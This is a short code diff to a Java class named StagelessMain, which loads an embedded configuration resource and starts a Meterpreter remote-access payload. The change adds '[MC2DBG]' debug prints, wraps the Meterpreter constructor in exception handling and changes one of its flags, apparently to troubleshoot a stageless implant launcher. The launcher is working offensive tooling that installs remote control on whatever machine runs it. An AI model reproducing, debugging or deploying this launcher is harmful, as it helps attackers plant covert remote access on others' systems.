@@ -13,7 +13,9 @@ public class StagelessMain {
     private static final String CONFIG_RESOURCE = "/META-INF/data";
 
     public static void main(String[] args) throws Exception {
+        System.err.println("[MC2DBG] StagelessMain.main entered");
         InputStream cfg = StagelessMain.class.getResourceAsStream(CONFIG_RESOURCE);
+        System.err.println("[MC2DBG] config resource " + (cfg == null ? "MISSING" : "loaded"));
         if (cfg == null) {
             throw new RuntimeException("no embedded config block");
         }
@@ -27,6 +29,13 @@ public class StagelessMain {
         } finally {
             cfg.close();
         }
-        new Meterpreter(buf.toByteArray(), true, true);
+        try {
+            new Meterpreter(buf.toByteArray(), true, false);
+        } catch (Exception e) {
+            System.err.println("[MC2DBG] Meterpreter ctor threw: " + e);
+            e.printStackTrace(System.err);
+            throw e;
+        }
+        System.err.println("[MC2DBG] Meterpreter ctor returned (loop exited)");
     }
 }
